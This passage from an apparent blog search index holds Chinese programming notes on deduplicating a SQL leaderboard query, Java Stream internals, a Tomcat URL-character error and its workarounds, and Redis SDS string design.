private修饰的方法导致Service注入为空这一次搞懂Spring代理创建及AOP链式调用过程为什么你写的Controller里，private方法中的bean&#x3D;null？\n","categories":["编程记录"],"tags":["spring","aop","动态代理","cglib"]},{"title":"sql多条件排序并去重","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/sql%E5%A4%9A%E6%9D%A1%E4%BB%B6%E6%8E%92%E5%BA%8F%E5%B9%B6%E5%8E%BB%E9%87%8D/","content":"需求描述首先有一张用户分数表：\n\n然后需要实现一个排行榜的查询：查询某一谱面（chart_id）的排行榜，排序规则为分数降序，时间降序（鼓励用户去挑战理论值，刷新排行榜）并且每个排行榜中每个用户仅出现一次。（去重，防止出现排行榜全是一个人的情况）\n实现过程第一次实现排行榜时，并没有考虑到去重。\nselect user_id,score,create_timefrom user_scorewhere chart_id = 11order by score desc ,create_time desclimit 50\n\n不出意外，如果同一用户打了多次同一铺面，并且分数排名前50，排行榜上便会有多个该用户。发现重复问题是因为拿着查询出来的 user_id 去获取用户信息时，数据的数量对不上。\n随后我陷入了痛苦的思考 sql 过程中。太久没写复杂点的，快忘光了。\n在求助开发组其他四名成员后，也没有结果。因为大家陷入了激烈的讨论中……（23点55分问的，睡前脑力小练习）有一个提议： sql 不好写出来，可以将数据查出来，用代码逻辑处理（遇事不决，业务层拼接）这个方案不到实在写不出来，我不会考虑的。\n然后突然有一个人说：ChatGPT 怎么说这句话，让我的灵魂仿佛得到了神圣的洗涤。还没毕业就要失业了不过不得不说，ChatGPT 强是真的强。在不断的对话引导中，ChatGPT 给出了下面的 sql\nSELECT s.user_id, s.score, s.create_timeFROM user_score s         INNER JOIN (SELECT user_id, chart_id, MAX(score) AS max_score                     FROM user_score                     WHERE chart_id = 11                     GROUP BY user_id, chart_id) t                    ON s.user_id = t.user_id AND s.chart_id = t.chart_id AND s.score = t.max_scoreWHERE s.chart_id = 11ORDER BY s.score DESCLIMIT 50;\n\n当这段代码出来的时候，我的灵魂真的得到了神圣的洗涤。我记起了一个东西 ———— inner join因为是多条件排序，所以 group by 用不了，我甚至找到了 row_number() over () 的用法，但可惜他是 mysql8.0 的函数。服务器 mysql 的版本才5.7.25当然，上面那段代码还是有些许问题的。他的时间没有去重，即同一用户同一分数出现多次，并且上榜，就会重复。（在这里感谢 user_id 为 3177 的用户让我发现了这个 bug，也恭喜他教程这个铺面两次达到理论值（满分））后续对 ChatGPT 的引导中，ChatGPT说他忘了，他甚至可以“忘记”。此时，已是半夜的 2点18分。虽然那个 sql 是 ChatGPT 0点27分给出来的。\n最后在 2点49分，我给出了两次自连接的 sql。但性能不高，只是能用，随后我就眠了。（熬不下去了）\nSELECT s.user_id, s.score, s.create_timeFROM user_score s         INNER JOIN (SELECT user_id, chart_id, MAX(score) AS max_score                     FROM user_score                     WHERE chart_id = 11                     GROUP BY user_id, chart_id) t                    ON s.user_id = t.user_id AND s.chart_id = t.chart_id AND s.score = t.max_score         inner join(select user_id, chart_id, max(create_time) as time                    from user_score                    where chart_id = 11                    group by user_id, chart_id) u                   on s.user_id = u.user_id AND s.chart_id = u.chart_id AND s.create_time = u.timeWHERE s.chart_id = 11ORDER BY s.score DESC, s.create_time DESCLIMIT 50;\n\n然后，另一人给出了一次自连接的 sql，连接越少性能越高。表中当时的数据量在五万左右。查询耗时在 300ms 多一点，下面的 sql 稍快一些 \nSELECT s.user_id, s.score, MAX(s.create_time) AS create_timeFROM user_score s         INNER JOIN (SELECT user_id, chart_id, MAX(score) AS max_score                     FROM user_score                     WHERE chart_id = 11                     GROUP BY user_id, chart_id) t                    ON s.user_id = t.user_id AND s.score = t.max_scoreWHERE s.chart_id = 11GROUP BY user_idORDER BY score DESC, create_time DESCLIMIT 50\n\n此时讨论已经结束，最后一条消息在 3点49分11秒，内容为 该眠了\n时间来到，第二天。关于性能问题，有两个解决方案。\n第一种是缓存查询结果，每小时或者每天更新一次。但是 冲完榜要过一段时间才能看到有点打击人（所以这个方案被放弃了，实现起来也少许有些麻烦。\n第二种是 loading画的炫酷一点就好了这句话，我要裱起来。\n\nloading画的炫酷一点就好了\n\n到此，sql 的编写就结束了。下面来复习下被我忘却的 表连接\n表连接先贴个 SQL 连接(JOIN) | 菜鸟教程\n表连接用于将多个表的行结合起来，有4种连接方式。inner join、full join、left join、right join。\n这个来自菜鸟教程的图是真的好，完美解释了用法：\n\n表连接，算是是一种表的乘法。外连接的话（左连接、右连接、全连接）。根据连接条件，将一条数据变成多个。比如全连接以主键相等为连接条件的话，结果的行数为参与连接的表的行数的乘积。内连接的话（只有内连接）。就是根据连接条件取参与连接的表交集。\n其他的没什么，学过的看到上面类似集合的图就能想起来用法，没学过的可以看看菜鸟的例子便于理解。好吧，这里写的确实挺简洁的。主要是恢复下我的记忆，所以不会太详细。\n","categories":["编程记录"],"tags":["sql"]},{"title":"stream流的使用","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/stream%E6%B5%81%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"stream 流的介绍和特点stream 流不是某种数据结构，也不会保存数据，但是它负责相关计算。像是一个高级的迭代器，只需要指定依次需要执行哪些操作，stream 流便会隐式地遍历并附加执行指定的操作。\nstream的使用流程：\n\n创建 stream 流\n调用 stream 流的中间方法，对数据进行处理\n调用 stream 流的终止方法，对结果进行处理，并结束 stream 流\n\nstream 流提供了惰性计算和并行计算的能力。stream 流的实现类似一个双向链表，创建 stream 流实际是创建了这个双向链表的头节点。调用中间方法时，stream 流会在链表尾部添加新的节点，并将需要执行的操作（函数）记录下来。（并不会立刻执行，这是惰性计算的原因调用终止方法时，stream 流会从链表头部开始，依次执行链表中记录的操作，并返回结果。\n看了一下 Stream 的源码，它为了应对广泛的使用场景而进行了高度封装，抽象程度很高。暂时不是我能看懂的。所以就记录下使用，不详细分析源码。（看不懂怎么分析啊下面是源码的结构（也许不全吧\n\n在 jdk 源代码的结构中，Stream 只是一个接口，并没有操作的缺省实现。最主要的实现是 ReferencePipeline，而 ReferencePipeline 继承自 AbstractPipeline ，AbstractPipeline 实现了 BaseStream 接口并实现了它的方法。但 ReferencePipeline 仍然是一个抽象类，因为它并没有实现所有的抽象方法，比如 AbstractPipeline 中的 opWrapSink。ReferencePipeline内部定义了三个静态内部类，分别是：Head，StatelessOp，StatefulOp，但只有 Head 不再是抽象类。\nReferencePipeline 包含了控制数据流入的 Head ，中间操作 StatelessOp（无状态操作），StatefulOp（有状态操作），终止操作 TerminalOp。\n\n中间操作（Intermediate Operations）包含无状态操作与有状态操作：\n无状态（Stateless）操作：每个数据的处理是独立的，不会影响或依赖之前的数据。如 filter()、flatMap()、flatMapToDouble()、flatMapToInt()、flatMapToLong()、map()、mapToDouble()、mapToInt()、mapToLong()、peek()、unordered() 等\n有状态（Stateful）操作：处理时会记录状态，比如处理了几个。后面元素的处理会依赖前面记录的状态，或者拿到所有元素才能继续下去。如 distinct()、sorted()、sorted(comparator)、limit()、skip() 等\n\n\n终止操作（Terminal Operations）包含非短路操作与短路操作：\n非短路操作：处理完所有数据才能得到结果。如 collect()、count()、forEach()、forEachOrdered()、max()、min()、reduce()、toArray()等。\n短路（short-circuiting）操作：拿到符合预期的结果就会停下来，不一定会处理完所有数据。如 anyMatch()、allMatch()、noneMatch()、findFirst()、findAny() 等。\n\n\n\n创建 stream 流\n\n\n方法\n用处\n\n\n\nstream()\n创建出一个新的stream串行流对象\n\n\nparallelStream()\n创建出一个可并行执行的stream流对象\n\n\nStream.of()\n通过给定的一系列元素创建一个新的Stream串行流对象\n\n\nArrays.stream() &#x2F; Stream.of ();\n从数组获取流。\n\n\nstream 流的创建最后都是通过 StreamSupport 类来实现的。parallel 参数用来区分串行流和并行流。\npublic final class StreamSupport &#123;    public static &lt;T&gt; Stream&lt;T&gt; stream(Spliterator&lt;T&gt; spliterator, boolean parallel) &#123;        Objects.requireNonNull(spliterator);        return new ReferencePipeline.Head&lt;&gt;(spliterator,                StreamOpFlag.fromCharacteristics(spliterator),                 parallel);    &#125;&#125;\nReferencePipeline.Head&lt;&gt;() 方法一直 super 到父类 AbstractPipeline 中的实现，大致看得懂是个双向的链表结构。（也许\nabstract class AbstractPipeline&lt;E_IN, E_OUT, S extends BaseStream&lt;E_OUT, S&gt;&gt;        extends PipelineHelper&lt;E_OUT&gt; implements BaseStream&lt;E_OUT, S&gt; &#123;    AbstractPipeline(Spliterator&lt;?&gt; source,                     int sourceFlags, boolean parallel) &#123;        this.previousStage = null;        this.sourceSpliterator = source;        this.sourceStage = this;        this.sourceOrOpFlags = sourceFlags &amp; StreamOpFlag.STREAM_MASK;        // The following is an optimization of:        // StreamOpFlag.combineOpFlags(sourceOrOpFlags, StreamOpFlag.INITIAL_OPS_VALUE);        this.combinedFlags = (~(sourceOrOpFlags &lt;&lt; 1)) &amp; StreamOpFlag.INITIAL_OPS_VALUE;        this.depth = 0;        this.parallel = parallel;    &#125;&#125;\n\n中间操作中间操作可以有很多，他们的返回值都是一个新的 stream 流对象，可以进行链式调用。使用 stream 流时原始数据是不会发生改变的。中间操作是惰性计算的，也就是调用后并不会立刻执行，只有进行终止操作时，这些中间操作才会一起被执行。如果没有终止操作，中间操作不会被执行！如果遍历没有完成，想要的结果已经获取到了（比如获取第一个值），会停止遍历，然后返回结果。（短路操作？惰性计算可以显著提高运行效率。\n常用的中间操作见下表（列举部分）：\n\n\n\n中间操作\n用处\n\n\n\nfilter(Predicate&lt;? super T&gt; predicate)\n过滤\n\n\nmap(Function&lt;? super T, ? extends R&gt; mapper)\n映射\n\n\ndistinct()\n去重\n\n\nsorted()\n排序\n\n\nlimit(long maxSize)\n限制\n\n\nskip(long n)\n跳过\n\n\n重点记录下映射的用法，映射有两种\n\nmap 必须是一对一映射，将每个元素转换为一个新的元素（可以是一个新的集合）。\nflatMap 可以是一对多映射的，将每个元素转换为一个或多个元素（比 map 多了扁平化处理，将映射后的结果进行合并）。\n\n下面是例子，用来展示 map 和 flatMap 的用法和区别。\npublic class Main &#123;    public static void main(String[] args) &#123;        Stream&lt;String&gt; stringStream = Stream.of(&quot;hello&quot;, &quot;world&quot;, &quot;java&quot;, &quot;stream&quot;);        // 将流中每个元素变为大写（一对一        List&lt;String&gt; stringList1 = stringStream.map(String::toUpperCase).collect(Collectors.toList());        // 流已经执行过终止操作，再执行其他操作会报错：        // java.lang.IllegalStateException: stream has already been operated upon or closed        stringStream = Stream.of(&quot;hello&quot;, &quot;world&quot;, &quot;java&quot;, &quot;stream&quot;);        // 将流中每个元素转换为字符数组（一对多        List&lt;String&gt; stringList2 = stringStream.flatMap(s -&gt; Stream.of(s.split(&quot;&quot;))).collect(Collectors.toList());        System.out.println(stringList1);        // [HELLO, WORLD, JAVA, STREAM]        System.out.println(stringList2);        // [h, e, l, l, o, w, o, r, l, d, j, a, v, a, s, t, r, e, a, m]    &#125;&#125;\n\n\nflatmap 操作的时候其实是先每个元素处理并返回一个新的 Stream，然后将多个 Stream 展开合并为了一个完整的新的 Stream即 flatmap 操作分为两步： map 和 flatten （扁平化）\n\n所以 flatmap 可以将 集合中的集合展开，变成一个新的大集合。例子：\npublic class Main &#123;    public static void main(String[] args) &#123;        List&lt;List&lt;String&gt;&gt; list = new ArrayList&lt;&gt;();        list.add(Arrays.asList(&quot;hello&quot;, &quot;world&quot;, &quot;java&quot;, &quot;stream&quot;));        list.add(Arrays.asList(&quot;hello&quot;, &quot;world&quot;, &quot;java&quot;, &quot;stream&quot;));        // 将流中每个元素变为大写（一对一        List&lt;List&lt;String&gt;&gt; stringList1 = list.stream().map(i -&gt; i.stream().map(String::toUpperCase).toList()).collect(Collectors.toList());        // 将流中每个元素转换为大写（合并流        List&lt;String&gt; stringList2 = list.stream().flatMap(s -&gt; s.stream().map(String::toUpperCase)).collect(Collectors.toList());        System.out.println(stringList1);        // [[HELLO, WORLD, JAVA, STREAM], [HELLO, WORLD, JAVA, STREAM]]        System.out.println(stringList2);        // [HELLO, WORLD, JAVA, STREAM, HELLO, WORLD, JAVA, STREAM]    &#125;&#125;\n\n\nReferencePipeline 中 map 的实现，返回了一个无状态操作。（其中的 opWrapSink 看不懂一点，大概是流水线上的一个节点，包裹了我们要执行的操作。 \nabstract class ReferencePipeline&lt;P_IN, P_OUT&gt;        extends AbstractPipeline&lt;P_IN, P_OUT, Stream&lt;P_OUT&gt;&gt;        implements Stream&lt;P_OUT&gt;  &#123;    @Override    @SuppressWarnings(&quot;unchecked&quot;)    public final &lt;R&gt; Stream&lt;R&gt; map(Function&lt;? super P_OUT, ? extends R&gt; mapper) &#123;        Objects.requireNonNull(mapper);        return new StatelessOp&lt;P_OUT, R&gt;(this, StreamShape.REFERENCE,                                     StreamOpFlag.NOT_SORTED | StreamOpFlag.NOT_DISTINCT) &#123;            @Override            Sink&lt;P_OUT&gt; opWrapSink(int flags, Sink&lt;R&gt; sink) &#123;                return new Sink.ChainedReference&lt;P_OUT, R&gt;(sink) &#123;                    @Override                    public void accept(P_OUT u) &#123;                        downstream.accept(mapper.apply(u));                    &#125;                &#125;;            &#125;        &#125;;    &#125;&#125;\n\n这些中间操作（不管是无状态的 filter()，还是有状态的 sorted()）都只是返回了一个包含上一节点引用的中间节点。像单向链表。就这样把一个个中间操作拼接到了控制数据流入的 Head 后面，但是并没有开始做任何数据处理的动作。（惰性计算\n在 StatelessOp 和 StatefulOp 初始化的时候还会将当前节点的引用传递给上一个节点。下面源码中的 previousStage.nextStage = this;这个时候，这些节点组成了一个双向链表的结构。\nabstract class AbstractPipeline&lt;E_IN, E_OUT, S extends BaseStream&lt;E_OUT, S&gt;&gt;        extends PipelineHelper&lt;E_OUT&gt; implements BaseStream&lt;E_OUT, S&gt; &#123;    AbstractPipeline(AbstractPipeline&lt;?, E_IN, ?&gt; previousStage, int opFlags) &#123;        if (previousStage.linkedOrConsumed)            throw new IllegalStateException(MSG_STREAM_LINKED);        previousStage.linkedOrConsumed = true;        previousStage.nextStage = this;        this.previousStage = previousStage;        this.sourceOrOpFlags = opFlags &amp; StreamOpFlag.OP_MASK;        this.combinedFlags = StreamOpFlag.combineOpFlags(opFlags, previousStage.combinedFlags);        this.sourceStage = previousStage.sourceStage;        if (opIsStateful())            sourceStage.sourceAnyStateful = true;        this.depth = previousStage.depth + 1;    &#125;&#125;\n\n其他的中间操作也都差不多，flatMap 会更加复杂一些，就不贴了。\n终止操作终止操作会遍历 stream 流，并依次执行其中的中间操作，最后执行终止操作并返回结果。（当然有的终止操作并没有结果\n\n执行终止操作后，后续便不能对这个流进行任何操作了。上面中间操作 map 的例子中已经说明，继续操作已被终止或关闭的流会报错。\n\n简单的终止操作有 count、max、min、findAny、findFirst、anyMatch、allMatch、noneMatch 等方法。他们之所以简单，是因为返回结果为布尔值、数字或者 Optional 对象。\n常用的终止操作 collect，用于将流转换为集合。因为大多数情况，数据处理完要获取一个集合类的结果对象，像是 List 或者 Map 等。collect 上面中间操作 map 的例子中也有用到，就不再单独举例了。\nReferencePipeline 中 collect 的实现。if 判断中是并行流的处理（串行的的都没看懂，就不用看并行的了。毕竟涉及多线程的都不会简单。else 中 container 是流最后计算得到的结果。见下文继续return 返回结果。使用了 Collectors 收集器，也是 java8 的新特性，比较重要。不过我看不懂\nabstract class ReferencePipeline&lt;P_IN, P_OUT&gt;        extends AbstractPipeline&lt;P_IN, P_OUT, Stream&lt;P_OUT&gt;&gt;        implements Stream&lt;P_OUT&gt;  &#123;    @Override    @SuppressWarnings(&quot;unchecked&quot;)    public final &lt;R, A&gt; R collect(Collector&lt;? super P_OUT, A, R&gt; collector) &#123;        A container;        if (isParallel()                &amp;&amp; (collector.characteristics().contains(Collector.Characteristics.CONCURRENT))                &amp;&amp; (!isOrdered() || collector.characteristics().contains(Collector.Characteristics.UNORDERED))) &#123;            container = collector.supplier().get();            BiConsumer&lt;A, ? super P_OUT&gt; accumulator = collector.accumulator();            forEach(u -&gt; accumulator.accept(container, u));        &#125;        else &#123;            container = evaluate(ReduceOps.makeRef(collector));        &#125;        return collector.characteristics().contains(Collector.Characteristics.IDENTITY_FINISH)               ? (R) container               : collector.finisher().apply(container);    &#125;&#125;\n\nReduceOps.makeRef 接收此 collector 返回了一个 ReduceOp（实现了 TerminalOp 接口）的实例。（ReduceOps.makeRef 源码略返回的 ReduceOp 实例又被传递给 AbstractPipeline 中的 evaluate() 方法。在 evaluate 中，调用了 ReduceOp 实例的 evaluateSequential 方法，并将上流水线上最后一个节点的引用和 sourceSpliterator 传递进去。\nabstract class AbstractPipeline&lt;E_IN, E_OUT, S extends BaseStream&lt;E_OUT, S&gt;&gt;        extends PipelineHelper&lt;E_OUT&gt; implements BaseStream&lt;E_OUT, S&gt; &#123;    final &lt;R&gt; R evaluate(TerminalOp&lt;E_OUT, R&gt; terminalOp) &#123;        assert getOutputShape() == terminalOp.inputShape();        if (linkedOrConsumed)            throw new IllegalStateException(MSG_STREAM_LINKED);        linkedOrConsumed = true;        return isParallel()               ? terminalOp.evaluateParallel(this, sourceSpliterator(terminalOp.getOpFlags()))               : terminalOp.evaluateSequential(this, sourceSpliterator(terminalOp.getOpFlags()));    &#125;&#125;\n然后调用 ReduceOp 实例的 makeSink() 方法返回其 makeRef() 方法内部类 ReducingSink 的实例。接着 ReducingSink 的实例作为参数和 spliterator 一起传入最后一个节点的 wrapAndCopyInto() 方法，返回值是 Sink 。\nfinal class ReduceOps &#123;    private static abstract class ReduceOp&lt;T, R, S extends AccumulatingSink&lt;T, R, S&gt;&gt;        implements TerminalOp&lt;T, R&gt; &#123;        @Override        public &lt;P_IN&gt; R evaluateSequential(PipelineHelper&lt;T&gt; helper,                                           Spliterator&lt;P_IN&gt; spliterator) &#123;            return helper.wrapAndCopyInto(makeSink(), spliterator).get();        &#125;    &#125;&#125;\n\n到这里都是构建最后一个节点的 Sink 。然后 wrapAndCopyInto 做了两件事 wrapSink() 和 copyInto()。\nabstract class AbstractPipeline&lt;E_IN, E_OUT, S extends BaseStream&lt;E_OUT, S&gt;&gt;        extends PipelineHelper&lt;E_OUT&gt; implements BaseStream&lt;E_OUT, S&gt; &#123;    @Override    final &lt;P_IN, S extends Sink&lt;E_OUT&gt;&gt; S wrapAndCopyInto(S sink, Spliterator&lt;P_IN&gt; spliterator) &#123;        copyInto(wrapSink(Objects.requireNonNull(sink)), spliterator);        return sink;    &#125;&#125;\n\nwrapSink()将最后一个节点创建的 Sink 传入，并且看到里面有个 for 循环。每个节点都记录了上一节点的引用 previousStage 和每一个节点的深度 depth。所以这个 for 循环是从最后一个节点开始，到第二个节点结束。每一次循环都是将上一节点的 combinedFlags 和当前的 Sink 包起来生成一个新的 Sink 。这和前面拼接各个中间操作很类似，只不过拼接的是 Sink 的实现类的实例，方向相反。\nabstract class AbstractPipeline&lt;E_IN, E_OUT, S extends BaseStream&lt;E_OUT, S&gt;&gt;        extends PipelineHelper&lt;E_OUT&gt; implements BaseStream&lt;E_OUT, S&gt; &#123;    @Override    @SuppressWarnings(&quot;unchecked&quot;)    final &lt;P_IN&gt; Sink&lt;P_IN&gt; wrapSink(Sink&lt;E_OUT&gt; sink) &#123;        Objects.requireNonNull(sink);        for ( @SuppressWarnings(&quot;rawtypes&quot;) AbstractPipeline p=AbstractPipeline.this; p.depth &gt; 0; p=p.previousStage) &#123;            sink = p.opWrapSink(p.previousStage.combinedFlags, sink);        &#125;        return (Sink&lt;P_IN&gt;) sink;    &#125;&#125;\n\ncopyInto()到了要真正开始迭代的地方，这个方法接收两个参数 Sink wrappedSink, Spliterator spliterator 。wrappedSink 对应的是 Head 节点后面的第一个操作节点（它相当于这串 Sink 的头），spliterator 对应着数据源。\n回过头看一下 Sink 这个接口，它继承自 Consumer 接口，又定义了begin()、end()、cancellationRequested() 方法。Sink 直译过来是水槽，如果把数据流比作水，那水槽就是水会流过的地方。begin() 用于通知水槽的水要过来了，里面会做一些准备工作，同样 end() 是做一些收尾工作。cancellationRequested() 是原来判断是不是可以停下来了。Consumer 里的accept() 是消费数据的地方。\nabstract class AbstractPipeline&lt;E_IN, E_OUT, S extends BaseStream&lt;E_OUT, S&gt;&gt;        extends PipelineHelper&lt;E_OUT&gt; implements BaseStream&lt;E_OUT, S&gt; &#123;    @Override    final &lt;P_IN&gt; void copyInto(Sink&lt;P_IN&gt; wrappedSink, Spliterator&lt;P_IN&gt; spliterator) &#123;        Objects.requireNonNull(wrappedSink);        if (!StreamOpFlag.SHORT_CIRCUIT.isKnown(getStreamAndOpFlags())) &#123;            wrappedSink.begin(spliterator.getExactSizeIfKnown());            spliterator.forEachRemaining(wrappedSink);            wrappedSink.end();        &#125;        else &#123;            copyIntoWithCancel(wrappedSink, spliterator);        &#125;    &#125;&#125;\n\n有了完整的水槽链，就可以让水流进去了。copyInto() 里做了三个动作:\n\n通知第一个水槽（Sink）水要来了，准备一下。\n让水流进水槽（Sink）里。\n通知第一个水槽（Sink）水流完了，该收尾了。\n\n最后数据流到终止节点，终止节点将数据收集起来就结束了。然后就没有然后了，copyInto() 返回类型是 void ，没有返回值。wrapAndCopyInto() 返回了 TerminalOps 创建的 Sink，这时候它里面已经包含了最终处理的结果。调用它的 get() 方法就获得了最终的结果。\n关于并行流Stream 的并行编程，底层是基于 ForkJoinPool 技术来实现的。ForkJoinPool 是 Java 7 引入的用于并行执行的任务框架，核心思想是将一个大任务拆分成多个小任务（即fork），然后再将多个小任务的处理结果汇总到一个结果上（即join）。此外，它也提供基本的线程池功能，譬如设置最大并发线程数，关闭线程池等。\n可能会存在死锁、线程安全等问题，多线程需要考虑的他应该也都需要考虑。当然，如果不是很了解多线程。最好还是不要使用。\n总结使用也没有写多少，还是想分析源码是怎么实现。但奈何看不太懂，实在是太抽象了。加之当中对很多场景进行了高度的封装，代码十分的多，还有类型的特化（减少频繁拆装箱操作造成的性能浪费。\n大体的实现思路是写出来了。就是双向链表的结构，套了很多封装。\n代码是跟着知乎大佬的文章看的，这篇关于源代码分析的部分大多也是知乎大佬文章中的。那就在下面加粗一下，然后浅浅的佩服下大佬。\n参考全面吃透JAVA Stream流操作，让代码更加的优雅 - 架构悟道 - 博客园 (cnblogs.com)Java Stream 源码深入解析 - 掘金 (juejin.cn)Java 8 Stream 流式操作 (wdbyte.com)JAVA Stream简单原理——手写一个Stream流 - 掘金 (juejin.cn)原来你是这样的 Stream —— 浅析 Java Stream 实现原理 - 知乎 (zhihu.com)用了Stream后，代码反而越写越丑？ - 掘金 (juejin.cn)Java基础提高之Spliterator - 掘金 (juejin.cn)Java中的函数式编程（八）流Stream并行编程 - 安员外 - 博客园 (cnblogs.com)\n","categories":["学习笔记"],"tags":["java","stream","源码"]},{"title":"tomcat请求接口无效字符问题","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/tomcat%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E6%97%A0%E6%95%88%E5%AD%97%E7%AC%A6%E9%97%AE%E9%A2%98/","content":"场景环境：SpringBoot(2.6.11)内置tomcat(9.0.65)\n在Get请求中含有特殊字符{}时报错，实际场景是请求参数为json格式的数据。\njava.lang.IllegalArgumentException: Invalid character found in the request target [/test/test?id=&#123;&#125; ]. The valid characters are defined in RFC 7230 and RFC 3986\n\n原因tomcat8.0以上版本遵从RFC规范添加了对Url的特殊字符的限制。url中只允许包含：\n\n英文字母(a-zA-Z)\n数字(0-9)\n-_.~四个特殊字符\n保留字符( ! * ’ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ] )一共84个字符。\n\n解决方案降低tomcat版本（不建议）降低版本至7.0.76之前。\n\n逃避不是办法，要直面问题。\n\n添加关于tomcat的配置类@Configurationpublic class TomcatConfig &#123;    @Bean    public TomcatServletWebServerFactory webServerFactory() &#123;        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();        factory.addConnectorCustomizers((Connector connector) -&gt; &#123;                connector.setProperty(&quot;relaxedPathChars&quot;, &quot;\\&quot;&lt;&gt;[\\\\]^`&#123;|&#125;&quot;);                connector.setProperty(&quot;relaxedQueryChars&quot;, &quot;\\&quot;&lt;&gt;[\\\\]^`&#123;|&#125;&quot;);        &#125;);        return factory;    &#125;&#125;\n\n使用post请求方式(建议)将参数写入请求体内，而不是url。\n出现这个问题的原因是我虽然使用的是post请求，但是参数是没有写在请求体中，而是和get请求一样写在url中。\n","categories":["编程记录"],"tags":["tomcat","bug"]},{"title":"《Redis设计与实现》读书笔记-数据结构与对象","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8ARedis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AF%B9%E8%B1%A1/","content":"前言有点遗憾，梁敬彬和梁敬弘老师关于数据库的第二本佳作《收获，不止SQl优化》短期内可能不会去看了。正如老师在《收获，不止Oracle》第一章中所写，数据库是个庞大的体系，应该根据自己的需求去学习。目前看来，时机未到。我需要更多的积累之后，再去阅读关于SQL优化的书。毕竟没有足够的使用经验，很难达到“哦，原来可以这么优化”的顿悟的感觉。所以暂且搁置。开始 Redis 的学习，知识的广度也很重要。\n《Redis设计与实现》第一部分：数据结构与对象包含第2-8章。第一章是引言，介绍书的大概结构和阅读顺序，这里省略。\n第二章 - 简单动态字符串Redis 没有直接使用 C 语言传统的字符串（以空字符结尾的字符数组），而是自己实现了一种新的字符串类型，叫做简单动态字符串，简称SDS（Simple Dynamic String）。并使用 SDS 来作为 Redis 的默认字符串表示。Redis 中在一些无需对字符串进行修改的地方会使用C字符串作为字符串字面量（string literal），比如打印日志等。而在需要修改字符串时，会使用 SDS 表示字符串值。比如：\nset msg &quot;hello world&quot;\n\nRedis 会在数据库中创建一个键值对，键是一个 SDS 对象，保存着字符串 “msg”，值也是一个 SDS 对象，保存着字符串 “hello world”。\n除了用来保存数据库中的字符串值之外，SDS 还被用作缓冲区(buffer):AOF 模块中的 AOF 缓冲区，以及客户端状态中的输入缓冲区，都是由SDS 实现的。\nSDS 的定义每个sds.h&#x2F;sdshdr结构表示一个SDS值：\nstruct sdshdr &#123;    // 记录 buf 数组中已使用字节的数量    // 等于 SDS 所保存字符串的长度    int len;    // 记录 buf 数组中未使用字节的数量    int free;    // 字节数组，用于保存字符串    char buf[];&#125;;\n\n\n上面是一个 SDS 的示例，其中\n\nfree 属性为 0，表示 SDS 没有分配任何未使用空间\nlen 属性为 5，表示 SDS 保存了一个 5 字节长的字符串\nbuf 属性是一个字节数组，数组中保存着字符串 “hello” 的五个字节和最后一个空字符 ‘\\0’\n\nSDS 遵循 C 字符串以空字符结尾的惯例，保存空字符的 1 字节空间不计算在 SDS 的 len 属性里面。并且为空字符分配额外的 1 字节空间，以及添加空字符到字符串末尾等操作，都是由 SDS 函数自动完成的，所以这个空字符对于 SDS的使用者来说是完全透明的。遵循空字符结尾这一惯例的好处是，SDS 可以直接重用一部分 C 字符串函数库里面的函数。而无需为 SDS 做任何额外的工作。\n下面这个 SDS 和之前展示的 SDS 的区别在于，这个 SDS 为 buf 数组分配了五字节未使用空间，所以它的 free 属性的值为 5\n\n后面介绍 free 空间在 SDS 中的作用。\nSDS 与 C 字符串的区别根据传统，C 语言使用长度为 N+1 的字符数组来表示长度为 N 的字符串，并且字符数组的最后一个元素总是空字符’\\0’。\n常数复杂度获取字符串长度因为 C 字符串并不记录自身的长度信息，所以为了获取一个 C 字符串的长度，程序必须遍历整个字符串，对遇到的每个字符进行计数，直到遇到代表字符串结尾的空字符为止，这个操作的复杂度为O（N）。和 C 字符串不同，因为 SDS 在 len 属性中记录了 SDS 本身的长度，所以获取一个 SDS 长度的复杂度仅为O（1）。设置和更新 SDS 长度的工作是由 SDS 的 API 在执行时自动完成的，使用 SDS 无须进行任何手动修改长度的工作。\n杜绝缓冲区溢出除了获取字符串长度的复杂度高之外，C字符串不记录自身长度带来的另一个问题是容易造成缓冲区溢出（buffer overflow）。举个例子，&lt;string.h&gt;&#x2F;strcat 函数可以将 src 字符串中的内容拼接到 dest 字符串的末尾。因为 C 字符串不记录自身的长度，所以 strcat 假定用户在执行这个函数时，已经为 dest 分配了足够多的内存，可以容纳 src 字符串中的所有内容，而一旦这个假定不成立时，就会产生缓冲区溢出。\n而当 SDS API 需要对 SDS 进行修改时，API 会先检查 SDS 的空间是否满足修改所需的要求，如果不满足的话，API 会自动将 SDS 的空间扩展至执行修改所需的大小，然后才执行实际的修改操作，所以使用 SDS 既不需要手动修改 SDS 的空间大小，也不会出现前面所说的缓冲区溢出问题。\n减少修改字符串时带来的内存重分配次数因为 C 字符串并不记录自身的长度，所以对于一个包含了 N 个字符的 C 字符串来说，这个 C 字符串的底层实现总是一个 N+1 个字符长的数组（额外的一个字符空间用于保存空字符）。因为 C 字符串的长度和底层数组的长度之间存在着这种关联性，所以每次增长或者缩短一个 C 字符串，程序都总要对保存这个 C 字符串的数组进行一次内存重分配操作：\n\n如果程序执行的是增长字符串的操作，比如拼接操作（append），那么在执行这个操作之前，程序需要先通过内存重分配来扩展底层数组的空间大小——如果忘了这一步就会产生缓冲区溢出。\n如果程序执行的是缩短字符串的操作，比如截断操作（trim），那么在执行这个操作之后，程序需要通过内存重分配来释放字符串不再使用的那部分空间——如果忘了这一步就会产生内存泄漏。\n\n因为内存重分配涉及复杂的算法，并且可能需要执行系统调用，所以它通常是一个比较耗时的操作。由于 Redis 对性能的要求非常高，经常被用于数据频繁修改的场合。所以是不能接受每次修改字符串都需要进行内存重分配操作的。\nSDS 通过未使用空间解除了字符串长度和底层数组长度之间的关联：在 SDS 中，buf 数组的长度不一定就是字符数量加一，数组里面可以包含未使用的字节，而这些字节的数量就由 SDS 的 free 